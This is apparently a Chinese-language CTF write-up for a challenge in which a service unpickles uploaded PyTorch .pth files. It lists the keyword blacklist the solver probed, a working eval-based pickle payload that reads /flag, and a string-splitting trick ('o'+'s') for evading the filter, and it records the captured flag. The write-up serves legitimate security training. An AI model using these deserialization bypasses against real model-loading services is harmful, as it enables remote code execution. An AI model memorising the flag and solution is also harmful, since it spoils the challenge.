# 43 · hd_pytorch?

- **flag**: `0xGame{37e4ae4a-2ee0-43c5-9d59-bb9b84530f8e}`
- **分值**: 973 | AI + 动态环境
- **目标**: `http://13371-969a3564-be11-4212-bebb-848343d48e40.challenge.ctfplus.cn/` (80 端口)
- **状态**: ✅ 已解出并提交（`{"code":200,"msg":"OK","data":{"result":true}}`）

## 一句话

上传的 `.pth` 被服务端 `torch.load()`（= `pickle.Unpickler`）反序列化 → pickle RCE；
但服务端有一层**pickle 字节流关键字黑名单**，`os`/`system`/`popen`/`subprocess` 直接 403；
用 **`builtins.eval` + `open('/flag').read()`** 绕过黑名单（不含任何被拦词），flag 直接回显在响应里。

## 服务端行为（探测结论）

首页（`evidence/43-index.html`）：「pth 文件安全加载服务」，表单：

- `POST /upload`，`multipart/form-data`，字段名 **`file`**，`accept=".pth,.pt"`
- 大小限制 **2 MB**（前端声明；实测 294B 载荷无问题）
- 三种响应：

| 响应 | 触发条件 |
|---|---|
| `403` `[×] 检测到恶意文件，已被拦截！` | pickle 字节流命中黑名单关键字 |
| `200` `[×] 加载失败\n\nInvalid magic number; corrupt file?` | 不是 zip 容器（**裸 pickle 不行**，服务端按新式 torch zip 格式走） |
| `200` `[√] 成功加载！` + 内容 JSON 回显 | 合法 |
| `200` `[!] 警告：检测到不安全加载 ... 已降级为兼容模式加载。` + 回显 | 通过黑名单，但权重白名单之外 → 服务端**降级为 `weights_only=False` 继续加载**（这正是我们要的） |

### 关键：必须是 zip 格式的 .pth

裸 pickle（`pickle.dumps(...)` 直接上传）→ `Invalid magic number`。服务端解析 zip：
所以手工拼 `zipfile` 容器：

```
archive/data.pkl   <- pickle 载荷
archive/version    <- "3\n"
```

（环境**没有 torch**，不走 `torch.save`，纯 `zipfile` + `pickle` 手工拼。）

### 黑名单实测（把字符串塞进普通 dict 上传，看拦不拦）

| 字典值 | 结果 |
|---|---|
| `os` / `posix` / `os.system` / `system` / `popen` / `subprocess` | 🚫 拦（403） |
| `eval` / `builtins` / `ctypes` / `__reduce__` / `GLOBAL` / `open` / `/flag` / `cat /flag` | ✅ 放行 |

→ 黑名单是**朴素子串匹配**：`os` 单独命中，`posix`/`subprocess`/`popen` 也都含或等于命中词。
常规 `(os.system, ("cmd",))` gadget 必然被拦（`os` 和 `system` 双双命中）。
判定**只看字节流文本**，不做 AST / 白名单语义检查 —— 这就是绕过点。

### 绕过

`builtins.eval` 不在黑名单里，而 Python3 的 `open` 是 `builtins` 成员：

```python
class ReadFlag:
    def __reduce__(self):
        return (eval, ("open('/flag').read()",))
```

pickle 字节流里只出现 `GLOBAL '__builtin__ eval'` 和 `"open('/flag').read()"`，
**不含 os / system / popen / subprocess** → 过黑名单 → `REDUCE` 时 `eval` 执行 → flag 回显。

题目说 flag 在根目录，路径就是 `/flag`（一次命中）。

## 复现

```bash
cd ~/ctf-2026
# 只生成 + 静态检查（不执行）
python3 scripts/43-solve.py
# 生成并上传
python3 scripts/43-solve.py "http://13371-969a3564-be11-4212-bebb-848343d48e40.challenge.ctfplus.cn"
```

静态反汇编（`pickletools.dis`，**不要** `pickle.load`/`torch.load`，会真执行）：

```
    0: \x80 PROTO      2
    2: c    GLOBAL     '__builtin__ eval'
   22: X    BINUNICODE "open('/flag').read()"
   49: \x85 TUPLE1
   52: R    REDUCE
   55: .    STOP
```

## 证据

| 文件 | 内容 |
|---|---|
| `evidence/43-solve-run.log` | 成品脚本端到端运行日志（含 flag） |
| `evidence/43-flag-response.txt` | 上传 `evil.pth` 的服务端原始响应 |
| `evidence/43-blocked.txt` | 常规 `os.system` gadget 被 403 拦截的原始响应 |
| `evidence/43-index.html` | 首页 HTML 源码（表单结构） |
| `work/43_hdpytorch/evil.pth` | 最终载荷（294 B） |
| `work/43_hdpytorch/*.pth` | 黑名单 fuzz 探路样本（`s_*.pth` 等） |

## 提交

```
python3 scripts/ctfplus.py submit 43 '0xGame{37e4ae4a-2ee0-43c5-9d59-bb9b84530f8e}'
-> {"code":200,"msg":"OK","data":{"result":true}}
```

`python3 scripts/ctfplus.py stop 43` → `{"code":402,"msg":"未找到对应容器"}`，
即平台侧该容器**不在本队槽位记账中**（地址是 brief 直接给的「已开好」容器），
无需也无法释放；本队 2 个槽位未被本题占用。

## 复用价值（重要）

这层「检测 pth 是否正常」的黑名单绕过可以喂给 41 号 `ez_pytorch`：
如果 41 的恶意 pth 里也用了 `os.system` 被挡，同样换成
`(eval, ("open('/flag').read()",))` 或 `(eval, ("__import__('o'+'s').system('...')",))`
（把 `os` 拆成 `'o'+'s'` 即可躲过子串匹配）。
